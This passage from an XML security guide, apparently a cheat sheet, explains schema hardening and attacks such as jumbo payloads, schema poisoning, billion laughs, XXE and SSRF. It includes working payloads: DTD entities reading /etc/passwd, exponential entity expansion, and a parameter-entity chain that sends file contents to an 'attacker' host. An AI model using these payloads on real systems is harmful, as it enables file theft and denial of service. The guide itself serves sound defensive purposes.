<pre><code class="xml">&lt;xs:element name=&quot;SSN&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:token&quot;&gt;
   &lt;xs:pattern value=&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;/&gt;
  &lt;/xs:restriction&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
<h4 id="assertions">Assertions<a class="headerlink" href="#assertions" title="Permanent link">&para;</a></h4>
<p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
<pre><code class="xml">&lt;xs:element name=&quot;denominator&quot;&gt;
 &lt;xs:simpleType&gt;
  &lt;xs:restriction base=&quot;xs:integer&quot;&gt;
   &lt;xs:assertion test=&quot;$value != 0&quot;/&gt;
  &lt;/xs:restriction&gt;
 &lt;/xs:simpleType&gt;
&lt;/xs:element&gt;
</code></pre>

<p>The assertion guarantees that the <code>denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>
<h4 id="occurrences">Occurrences<a class="headerlink" href="#occurrences" title="Permanent link">&para;</a></h4>
<p>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: <code>minOccurs</code> and <code>maxOccurs</code>. The default value for both the <code>minOccurs</code> and the <code>maxOccurs</code> attributes is <code>1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code>minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code>maxOccurs</code> of <code>unbounded</code>, as in the following example:</p>
<pre><code class="xml">&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
 &lt;xs:element name=&quot;operation&quot;&gt;
  &lt;xs:complexType&gt;
   &lt;xs:sequence&gt;
    &lt;xs:element name=&quot;buy&quot; maxOccurs=&quot;unbounded&quot;&gt;
     &lt;xs:complexType&gt;
      &lt;xs:all&gt;
       &lt;xs:element name=&quot;id&quot; type=&quot;xs:integer&quot;/&gt;
       &lt;xs:element name=&quot;price&quot; type=&quot;xs:decimal&quot;/&gt;
       &lt;xs:element name=&quot;quantity&quot; type=&quot;xs:integer&quot;/&gt;
      &lt;/xs:all&gt;
     &lt;/xs:complexType&gt;
    &lt;/xs:element&gt;
  &lt;/xs:complexType&gt;
 &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</code></pre>

<p>The previous schema includes a root element named <code>operation</code>, which can contain an unlimited (<code>unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code>unbounded</code> value.</p>
<h2 id="jumbo-payloads">Jumbo Payloads<a class="headerlink" href="#jumbo-payloads" title="Permanent link">&para;</a></h2>
<p>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</p>
<h3 id="traditional-jumbo-payloads">Traditional Jumbo Payloads<a class="headerlink" href="#traditional-jumbo-payloads" title="Permanent link">&para;</a></h3>
<p>There are two primary methods to make a document larger than normal:</p>
<ul>
<li>Depth attack: using a huge number of elements, element names, and/or element values.</li>
<li>Width attack: using a huge number of attributes, attribute names, and/or attribute values.</li>
</ul>
<p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>
<pre><code class="xml">&lt;SOAPENV:ENVELOPE XMLNS:SOAPENV=&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot; 
                  XMLNS:EXT=&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;&gt;
 &lt;SOAPENV:HEADER LARGENAME1=&quot;LARGEVALUE&quot; 
                 LARGENAME2=&quot;LARGEVALUE2&quot; 
                 LARGENAME3=&quot;LARGEVALUE3&quot; â€¦&gt;
 ...
</code></pre>

<h3 id="small-jumbo-payloads">"Small" Jumbo Payloads<a class="headerlink" href="#small-jumbo-payloads" title="Permanent link">&para;</a></h3>
<p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root [
 &lt;!ENTITY file SYSTEM &quot;http://attacker/huge.xml&quot; &gt;
]&gt;
&lt;root&gt;&amp;file;&lt;/root&gt;
</code></pre>

<h2 id="schema-poisoning">Schema Poisoning<a class="headerlink" href="#schema-poisoning" title="Permanent link">&para;</a></h2>
<p>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>
<h3 id="local-schema-poisoning">Local Schema Poisoning<a class="headerlink" href="#local-schema-poisoning" title="Permanent link">&para;</a></h3>
<p>Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .</p>
<h4 id="embedded-schema">Embedded Schema<a class="headerlink" href="#embedded-schema" title="Permanent link">&para;</a></h4>
<p>The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [
 &lt;!ELEMENT note (to,from,heading,body)&gt;
 &lt;!ELEMENT to (#PCDATA)&gt;
 &lt;!ELEMENT from (#PCDATA)&gt;
 &lt;!ELEMENT heading (#PCDATA)&gt;
 &lt;!ELEMENT body (#PCDATA)&gt;
]&gt;
&lt;note&gt;
 &lt;to&gt;Tove&lt;/to&gt;
 &lt;from&gt;Jani&lt;/from&gt;
 &lt;heading&gt;Reminder&lt;/heading&gt;
 &lt;body&gt;Don't forget me this weekend&lt;/body&gt;
&lt;/note&gt;
</code></pre>

<p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>
<h4 id="incorrect-permissions">Incorrect Permissions<a class="headerlink" href="#incorrect-permissions" title="Permanent link">&para;</a></h4>
<p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>
<pre><code class="xml">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
&lt;note&gt;
 &lt;to&gt;Tove&lt;/to&gt;
 &lt;from&gt;Jani&lt;/from&gt;
 &lt;heading&gt;Reminder&lt;/heading&gt;
 &lt;body&gt;Don't forget me this weekend&lt;/body&gt;
&lt;/note&gt;
</code></pre>

<p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
<pre><code class="text">-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
</code></pre>

<p>The permissions set on <code>name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>
<h3 id="remote-schema-poisoning">Remote Schema Poisoning<a class="headerlink" href="#remote-schema-poisoning" title="Permanent link">&para;</a></h3>
<p>Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.</p>
<h4 id="man-in-the-middle-mitm-attack">Man-in-the-Middle (MitM) Attack<a class="headerlink" href="#man-in-the-middle-mitm-attack" title="Permanent link">&para;</a></h4>
<p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</p>
<pre><code class="xml">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;
&lt;note&gt;
 &lt;to&gt;Tove&lt;/to&gt;
 &lt;from&gt;Jani&lt;/from&gt;
 &lt;heading&gt;Reminder&lt;/heading&gt;
 &lt;body&gt;Don't forget me this weekend&lt;/body&gt;
&lt;/note&gt;
</code></pre>

<p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
<h4 id="dns-cache-poisoning">DNS-Cache Poisoning<a class="headerlink" href="#dns-cache-poisoning" title="Permanent link">&para;</a></h4>
<p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses. </p>
<p>The previous example referenced the host <code>example.com</code> using an unencrypted protocol. </p>
<p>When switching to HTTPS, the location of the remote schema will look like <code>https://example/note.dtd</code>. In a normal scenario, the IP of <code>example.com</code> resolves to <code>1.1.1.1</code>:</p>
<pre><code class="bash">$Â hostÂ example.com
example.comÂ hasÂ addressÂ 1.1.1.1
</code></pre>

<p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
<pre><code class="bash">$Â hostÂ example.com
example.comÂ hasÂ addressÂ 2.2.2.2
</code></pre>

<p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
<h4 id="evil-employee-attack">Evil Employee Attack<a class="headerlink" href="#evil-employee-attack" title="Permanent link">&para;</a></h4>
<p>When third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>).</p>
<h2 id="xml-entity-expansion">XML Entity Expansion<a class="headerlink" href="#xml-entity-expansion" title="Permanent link">&para;</a></h2>
<p>If the parser uses a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.</p>
<h3 id="sample-vulnerable-java-implementations">Sample Vulnerable Java Implementations<a class="headerlink" href="#sample-vulnerable-java-implementations" title="Permanent link">&para;</a></h3>
<p>Using the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.</p>
<p><strong>Sample XML</strong></p>
<pre><code class="xml">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;
&lt;contacts&gt;
 &lt;contact&gt;
  &lt;firstname&gt;John&lt;/firstname&gt; 
  &lt;lastname&gt;&amp;xxe;&lt;/lastname&gt;
 &lt;/contact&gt; 
&lt;/contacts&gt;
</code></pre>

<p><strong>Sample DTD</strong></p>
<pre><code class="xml">&lt;!ELEMENT contacts (contact*)&gt;
&lt;!ELEMENT contact (firstname,lastname)&gt;
&lt;!ELEMENT firstname (#PCDATA)&gt;
&lt;!ELEMENT lastname ANY&gt;
&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;
</code></pre>

<h4 id="xxe-using-dom">XXE using DOM<a class="headerlink" href="#xxe-using-dom" title="Permanent link">&para;</a></h4>
<pre><code class="java">import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource(&quot;contacts.xml&quot;));
   NodeList nodeList = doc.getElementsByTagName(&quot;contact&quot;);
   for (int s = 0; s &lt; nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName(&quot;firstname&quot;);
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println(&quot;First Name: &quot;  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName(&quot;lastname&quot;);
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println(&quot;Last Name: &quot; + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
</code></pre>

<p>The previous code produces the following output:</p>
<pre><code class="bash">$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>

<h4 id="xxe-using-dom4j">XXE using DOM4J<a class="headerlink" href="#xxe-using-dom4j" title="Permanent link">&para;</a></h4>
<pre><code class="java">import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read(&quot;contacts.xml&quot;);
  } catch (Exception e) {
   e.printStackTrace();
  } 
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
</code></pre>

<p>The previous code produces the following output:</p>
<pre><code class="bash">$ java test1
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;

&lt;contacts&gt;
 &lt;contact&gt;
  &lt;firstname&gt;John&lt;/firstname&gt;
  &lt;lastname&gt;### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>

<h4 id="xxe-using-sax">XXE using SAX<a class="headerlink" href="#xxe-using-sax" title="Permanent link">&para;</a></h4>
<pre><code class="java">import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse(&quot;contacts.xml&quot;, this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
</code></pre>

<p>The previous code produces the following output:</p>
<pre><code class="bash">$ java parseDocument
John
### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>

<h4 id="xxe-using-stax">XXE using StAX<a class="headerlink" href="#xxe-using-stax" title="Permanent link">&para;</a></h4>
<pre><code class="java">import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader(&quot;contacts.xml&quot;);
   File file = new File(&quot;contacts.xml&quot;);
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader(&quot;contacts.xml&quot;, 
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next(); 
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

</code></pre>

<p>The previous code produces the following output:</p>
<pre><code class="bash">$ java parseDocument
&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
</code></pre>

<h3 id="recursive-entity-reference">Recursive Entity Reference<a class="headerlink" href="#recursive-entity-reference" title="Permanent link">&para;</a></h3>
<p>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</p>
<pre><code class="xml">&lt;!DOCTYPE A [
 &lt;!ELEMENT A ANY&gt;
 &lt;!ENTITY A &quot;&lt;A&gt;&amp;B;&lt;/A&gt;&quot;&gt; 
 &lt;!ENTITY B &quot;&amp;A;&quot;&gt;
]&gt;
&lt;A&gt;&amp;A;&lt;/A&gt;
</code></pre>

<h3 id="quadratic-blowup">Quadratic Blowup<a class="headerlink" href="#quadratic-blowup" title="Permanent link">&para;</a></h3>
<p>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion <code>(O(n2))</code>. </p>
<p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
<pre><code class="xml">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;
 &lt;!ENTITY A &quot;AAAAA...(a 100.000 A's)...AAAAA&quot;&gt;
]&gt;
&lt;root&gt;&amp;A;&amp;A;&amp;A;&amp;A;...(a 100.000 &amp;A;'s)...&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;&lt;/root&gt;
</code></pre>

<h3 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h3>
<p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>
<pre><code class="xml">&lt;!DOCTYPE root [
 &lt;!ELEMENT root ANY&gt;
 &lt;!ENTITY LOL &quot;LOL&quot;&gt;
 &lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;
 &lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;
 &lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;
 &lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;
 &lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;
 &lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;
 &lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;
 &lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;
 &lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt; 
]&gt;
&lt;root&gt;&amp;LOL9;&lt;/root&gt;
</code></pre>

<p>The entity <code>LOL9</code> will be resolved as the 10 entities defined in <code>LOL8</code>; then each of these entities will be resolved in <code>LOL7</code> and so on. Finally, the CPU and/or memory will be affected by parsing the <code>3 x 10^9</code> (3,000,000,000) entities defined in this schema, which could make the parser crash.</p>
<p>The Simple Object Access Protocol (<a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a>) specification forbids <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>s completely. This means that a SOAP processor can reject any SOAP message that contains a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. Despite this specification, certain SOAP implementations did parse <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schemas within SOAP messages. </p>
<p>The following example illustrates a case where the parser is not following the specification, enabling a reference to a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> in a SOAP message:</p>
<pre><code class="xml">&lt;?XML VERSION=&quot;1.0&quot; ENCODING=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE SOAP-ENV:ENVELOPE [ 
 &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;
 &lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;
 &lt;!ENTITY LOL &quot;LOL&quot;&gt;
 &lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;
 &lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;
 &lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;
 &lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;
 &lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;
 &lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;
 &lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;
 &lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;
 &lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;
]&gt; 
&lt;SOAP:ENVELOPE ENTITYREFERENCE=&quot;&amp;LOL9;&quot; 
               XMLNS:SOAP=&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;&gt; 
 &lt;SOAP:BODY&gt; 
  &lt;KEYWORD XMLNS=&quot;URN:PARASOFT:WS:STORE&quot;&gt;FOO&lt;/KEYWORD&gt;
 &lt;/SOAP:BODY&gt;
&lt;/SOAP:ENVELOPE&gt;
</code></pre>

<h3 id="reflected-file-retrieval">Reflected File Retrieval<a class="headerlink" href="#reflected-file-retrieval" title="Permanent link">&para;</a></h3>
<p>Consider the following example code of an XXE:</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE root [
 &lt;!ELEMENT includeme ANY&gt;
 &lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;
</code></pre>

<p>The previous XML defines an entity named <code>xxe</code>, which is in fact the contents of <code>/etc/passwd</code>, which will be expanded within the <code>includeme</code> tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.</p>
<h3 id="server-side-request-forgery">Server Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Permanent link">&para;</a></h3>
<p>Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.</p>
<h4 id="external-dns-resolution">External DNS Resolution<a class="headerlink" href="#external-dns-resolution" title="Permanent link">&para;</a></h4>
<p>Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.</p>
<pre><code class="xml">&lt;!DOCTYPE m PUBLIC &quot;-//B/A/EN&quot; &quot;http://checkforthisspecificdomain.example.com&quot;&gt;
</code></pre>

<h4 id="external-connection">External Connection<a class="headerlink" href="#external-connection" title="Permanent link">&para;</a></h4>
<p>Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [ 
 &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; 
 %xxe;
]&gt;
</code></pre>

<h4 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities<a class="headerlink" href="#file-retrieval-with-parameter-entities" title="Permanent link">&para;</a></h4>
<p>Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
 &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
 &lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;
 %dtd;
]&gt;
&lt;root&gt;&amp;send;&lt;/root&gt;
</code></pre>

<p>Here the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> defines two external parameter entities: <code>file</code> loads a local file, and <code>dtd</code> which loads a remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>. The remote <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> should contain something like this:</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://example.com/?%file;'&gt;&quot;&gt;
%all;
</code></pre>

<p>The second <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> causes the system to send the contents of the <code>file</code> back to the attacker's server as a parameter of the URL.</p>
<h4 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h4>
<p>The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:</p>
<p><strong>1) Complete Disclosure</strong>: The simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.</p>
<p><strong>2) Error-based</strong>: If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:</p>
<pre><code class="text">java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
</code></pre>

